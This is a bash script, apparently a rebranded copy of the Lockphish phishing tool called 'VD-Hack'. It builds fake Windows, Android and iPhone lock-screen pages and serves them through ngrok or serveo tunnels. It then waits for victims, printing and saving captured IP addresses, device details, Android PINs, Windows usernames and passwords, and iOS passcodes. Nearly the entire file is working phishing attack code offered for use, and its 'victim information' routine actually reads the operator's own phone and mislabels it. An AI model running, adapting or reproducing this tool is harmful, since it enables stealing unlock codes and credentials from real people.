#!/bin/bash
# Lockphish v1.1
# Coded by: github.com/thelinuxchoice/lockphish
# Twitter: @linux_choice
# Read the License before using any part from this code.

trap 'printf "\n";stop' 2

R () {
	cd $PREFIX/bin
	if [ -e python ];then
	cd ~/VD-Hack
	#cd /sdcard/Gith*/Termux*
	echo -e "\033[0m"
	python .random.py
	fi
	}
	set() {
		cd $PREFIX/bin
		if [ -e lock ];then
		echo
		else
		termux-setup-storage
		bash ~/lockfish/setup.sh
		fi
		}
		hi() {
			printf "\n\n First learn basic!!\n\n"
			exit
			}
			fo () {
				cd ~
				if [ -e VD-Hack ];then
				set
				else
				hi
				fi
				}
				



stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
rm -f delete.txt
				printf "\n\n\033[1;93m Checking Victim phone information........."
				kernal="$(uname -r)"
				ver="$(getprop ro.build.version.release)"
				sdk="$(getprop ro.build.version.sdk)"
				arch="$(getprop ro.product.cpu.abilist)"
				cpu="$(getprop ro.board.platform)"
				phone2="$(getprop ro.product.brand)"
				phone="$(getprop ro.product.name)"
				time="$(date +"%r")"
				date="$(date +"%F")"
				cd $PREFIX/var/lib/dpkg > /dev/null 2>&1
				packk="$(grep -c -e "Package" status)"
				#battery="$(termux-battery-status|grep -e "percentage")"
				#locate="$(termux-location|grep -e "lat" 	-e "long")"
				printf "\n\n\033[1;92m Victim phone name :\033[0m $phone2\n"
				printf "\033[1;96m[\033[0m+\033[1;96m] \033[1;92m Victim phone name & modal :\033[0m $phone\n"
				printf "\033[1;96m[\033[0m+\033[1;96m] \033[1;92m Android Version :\033[0m Android version $ver\n"
				printf "\033[1;96m[\033[0m+\033[1;96m] \033[1;92m CPU :\033[0m $cpu\n"
				printf "\033[1;96m[\033[0m+\033[1;96m] \033[1;92m Architecture :\033[0m $arch\n"
				printf "\033[1;96m[\033[0m+\033[1;96m] \033[1;92m SDK :\033[0m SDK$sdk\n"
				printf "\033[1;96m[\033[0m+\033[1;96m] \033[1;92m Kernal :\033[0m $kernal\n"
				printf "\033[1;96m[\033[0m+\033[1;96m] \033[1;92m Packages :\033[0m $packk Packages installed\n"
				printf "\033[1;96m[\033[0m+\033[1;96m] \033[1;92m Time :\033[1;97m $time\n"
				printf "\033[1;96m[\033[0m+\033[1;96m] \033[1;92m Date :\033[1;97m $date\n"
				


device=$(grep -o ';.*;*)' ip.txt | cut -d ')' -f1 | tr -d ";")
printf "\033[1;96m[\033[0m+\033[1;96m] \e[1;92mIP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\033[1;96m[\033[0m+\033[1;96m] \e[1;92mDevice:\e[0m\e[1;77m %s\e[0m\n" $device
#cat ip.txt >> saved.ip.txt
cd ~/VD-Hack


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting Victims,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
pwd
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "pin.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Android PIN received!\e[0m\n"
pin=$(tail -n1 pin.txt)
printf "\e[1;96m[\e[0m+\e[1;96m] PIN:\e[0m\e[1;77m %s\e[0m\n" $pin
printf "\e[1;96m[\e[0m+\e[1;96m] Saved:\e[0m\e[1;77m pin.saved.txt\e[0m\n"
cat pin.txt >> pin.saved.txt
rm -rf pin.txt
fi

if [[ -e "passwords.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Win credentials received!\e[0m\n"
username=$(tail -n1 usernames.txt)
password=$(tail -n1 passwords.txt)
printf "\e[1;96m[\e[0m+\e[1;96m] Username:\e[0m\e[1;77m %s\e[0m\n" $username
printf "\e[1;96m[\e[0m+\e[1;96m] Password:\e[0m\e[1;77m %s\e[0m\n" $password
printf "\e[1;96m[\e[0m+\e[1;96m] Saved:\e[0m\e[1;77m win.saved.txt\e[0m\n"
cat usernames.txt >> win.saved.txt
cat passwords.txt >> win.saved.txt
rm -rf usernames.txt
rm -rf passwords.txt
fi

if [[ -e "passcode.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] IOS passcode received!\e[0m\n"
passcode=$(tail -n1 passcode.txt)
printf "\e[1;96m[\e[0m+\e[1;96m] Passcode:\e[0m\e[1;77m  %s\e[0m\n" $passcode
printf "\e[1;96m[\e[0m+\e[1;96m] Saved:\e[0m\e[1;77m  passcode.txt\e[0m\n"
cat passcode.txt >> passcode.saved.txt
rm -rf passcode.txt
fi

sleep 0.5

done 

}

### SERVEO DISABLED
server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m]\033[1;92m Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
if [ -z $send_link ];then
printf "\033[1;91m Error \n"
exit
fi
printf '\n\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n\n' $send_link

}


payload_ngrok() {
url=$redirect #"https://www.youtube.com"
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
payload_name="index"
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Building webpages\e[0m\n"
sed 's+forwarding_url+'$url'+g' post.php > cat.php
sed 's+forwarding_link+'$link'+g' win.html | sed 's+forwarding_url+'$url'+g' > win2.html
sed 's+forwarding_link+'$link'+g' phone.html | sed 's+forwarding_url+'$url'+g' > iphone2.html
sed 's+forwarding_link+'$link'+g' droid.html | sed 's+forwarding_url+'$url'+g' > droid2.html

IFS=$'\n'
data_base64=$(base64 -w 0 win2.html)
temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"

#printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Converting webpage to base64\e[0m\n" 
#printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Injecting Data URI code (base64) into index2.html\e[0m\n"
sed 's+forwarding_link+'$link'+g' template.html | sed 's+payload_name+'$payload_name'+g' | sed 's+data_base64+'${temp64}'+g ' > index2.html

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m+\e[1;33m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
if [ -z $link ];then
printf " \033[91m Error \n"
exit
fi
}

ngrok_server() {
cd ~/lockfish
if [[ -e ngrok ]]; then
echo ""
else
pwd
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
arch3=$(uname -a | grep -o 'amd64' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

elif [[ $arch3 == *'amd64'* ]] ; then

wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-amd64.zip ]]; then
unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-amd64.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 13

payload_ngrok
checkfound
}

# DISABLED
start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok and serveo\e[0m\n"
default_option_server="3"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 2 ]]; then
ngrok_server
elif [[ $option_server -eq 3 ]]; then
redirect
start2
redirect
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}


payload() {

link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

url=$redirect # "https://www.youtube.com"
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
payload_name="index"
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Building webpages...\e[0m\n"
sed 's+forwarding_url+'$url'+g' post.php > cat.php
sed 's+forwarding_link+'$link'+g' win.html | sed 's+forwarding_url+'$url'+g' > win2.html
sed 's+forwarding_link+'$link'+g' phone.html | sed 's+forwarding_url+'$url'+g' > iphone2.html
sed 's+forwarding_link+'$link'+g' droid.html | sed 's+forwarding_url+'$url'+g' > droid2.html

IFS=$'\n'
data_base64=$(base64 -w 0 win2.html)
temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"

#printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Converting webpage to base64\e[0m\n" 
#printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Injecting Data URI code (base64) into index2.html\e[0m\n"
sed 's+forwarding_link+'$link'+g' template.html | sed 's+payload_name+'$payload_name'+g' | sed 's+data_base64+'${temp64}'+g ' > index2.html



}

start2() {

default_choose_sub="Y"
default_subdomain="lockphish$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload

}
start() {

default_choose_sub="Y"
default_subdomain="lockphish$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound
}

redirect() {


default_redirect="https://www.youtube.com"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Redirect after phishing (Default:\e[0m\e[1;77m Youtube \e[0m\e[1;33m): \e[0m'
read redirect
redirect="${redirect:-${default_redirect}}"

}

phone () {
				banner
				printf "\n\n\033[1;92m Checking Internet .... :\033[1;97m "
				int
				printf "\n\n\033[1;92m Checking Your ip :\033[1;97m "
				ip="$(curl -s -N ifconfig.me)"
				printf "\033[1;96m Your ip :\033[1;97m $ip"
				printf "\n\n\033[1;93m Checking your phone information........."
				kernal="$(uname -r)"
				ver="$(getprop ro.build.version.release)"
				sdk="$(getprop ro.build.version.sdk)"
				arch="$(getprop ro.product.cpu.abilist)"
				cpu="$(getprop ro.board.platform)"
				phone2="$(getprop ro.product.brand)"
				phone="$(getprop ro.product.name)"
				time="$(date +"%r")"
				date="$(date +"%F")"
				cd $PREFIX/var/lib/dpkg > /dev/null 2>&1
				packk="$(grep -c -e "Package" status)"
				battery="$(termux-battery-status|grep -e "percentage")"
				locate="$(termux-location|grep -e "lat" 	-e "long")"
				printf "\n\n\033[1;96m[\033[0m+\033[1;96m] \033[1;92m Your phone name :\033[0m $phone2\n"
				printf "\033[1;96m[\033[0m+\033[1;96m] \033[1;92m Your phone name & modal :\033[0m $phone\n"
				printf "\033[1;92m Android Version :\033[0m Android version $ver\n"
				printf "\033[1;96m[\033[0m+\033[1;96m] \033[1;92m CPU :\033[0m $cpu\n"
				printf "\033[1;96m[\033[0m+\033[1;96m] \033[1;92m Architecture :\033[0m $arch\n"
				printf "\033[1;96m[\033[0m+\033[1;96m] \033[1;92m SDK :\033[0m SDK$sdk\n"
				printf "\033[1;96m[\033[0m+\033[1;96m] \033[1;92m Kernal :\033[0m $kernal\n"
				printf "\033[1;96m[\033[0m+\033[1;96m] \033[1;92m Packages :\033[0m $packk Packages installed\n"
				printf "\033[1;96m[\033[0m+\033[1;96m] \033[1;92m Time :\033[1;97m $time\n"
				printf "\033[1;96m[\033[0m+\033[1;96m] \033[1;92m Date :\033[1;97m $date\n"
				printf "\033[1;96m[\033[0m+\033[1;96m] \033[1;92m Battery :\033[1;97m $battery\n"
				printf "\033[1;96m[\033[0m+\033[1;96m] \033[1;92m Your location :\033[1;97m $locate\n"
				exit
				}


mym() {
	R
	fo
	figlet VD-Hack
	printf "\n\n \033[1;96m This Tool Created :\033[0m https://github.com/thelinuxchoice\033[91m (Currenty Not Available\033[0m)"
	printf "\n\033[1;96m This Tool Edited :\033[0m https://github.com/rootedcyber\n\n"
	printf "\033[96m[\033[0m1\033[96m]\033[1;93m Victim Device Information\n"
	printf "\033[96m[\033[0m2\033[96m]\033[1;93m Your Device Information\n\n\n"
	echo -e -n "\033[1;96mVD\033[0m@\033[96mHack -->> \033[0m"
	read a
	case $a in
	1)start1;;
	2)phone ;;
	*)mym ;;
	esac
	}
	
mym
redirect


